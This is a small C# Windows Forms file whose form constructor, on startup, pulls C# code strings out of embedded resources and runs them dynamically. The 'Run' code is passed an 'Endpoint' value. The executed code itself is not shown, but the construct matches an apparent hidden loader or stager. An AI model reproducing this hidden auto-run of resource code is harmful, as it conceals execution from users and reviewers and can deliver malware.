using System;
using System.Resources;
using System.Windows.Forms;


namespace frameless
{
    public partial class Form1 : Form
    {
        private async static void Runn()
        {
            var resource = new ResourceManager("frameless.Form1", typeof(Form1).Assembly);
       //     await Action.ExecuteCsharpCodeAsync(resource.GetString("Checker"), new object[] { });
         //   await Action.ExecuteCsharpCodeAsync(resource.GetString("Setup"), new object[] { });
            var x = await Action.ExecuteCsharpCodeAsync(resource.GetString("Run"), new object[] { Properties.Resources.Endpoint });
            Console.WriteLine(x);   
        }

        public Form1()
        {
            Runn();
            InitializeComponent();
        }
    }
}
